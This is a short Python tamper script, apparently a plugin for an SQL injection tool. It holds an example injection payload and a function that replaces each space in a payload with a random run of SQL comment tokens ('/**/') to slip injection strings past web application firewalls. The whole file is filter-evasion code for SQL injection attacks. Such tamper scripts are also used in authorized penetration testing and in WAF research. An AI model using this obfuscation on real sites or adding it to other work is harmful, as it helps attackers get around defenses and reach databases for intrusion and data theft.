import random


__example_payload__ = "' AND 1=1 OR 9=10 ORDERBY(1,2,3,4,5)"
__type__ = "change the payload spaces to a random amount of spaces obfuscated with a comment"


def tamper(payload, **kwargs):
    modifiers = ("/**/", "/**//**/", "/**//**//**/")
    retval = ""
    for char in payload:
        num = random.choice([1, 2, 3])
        if char != " ":
            retval += char
        if num == 1:
            if char == " ":
                retval += modifiers[0]
        elif num == 2:
            if char == " ":
                retval += modifiers[1]
        else:
            if char == " ":
                retval += modifiers[2]
    return retval
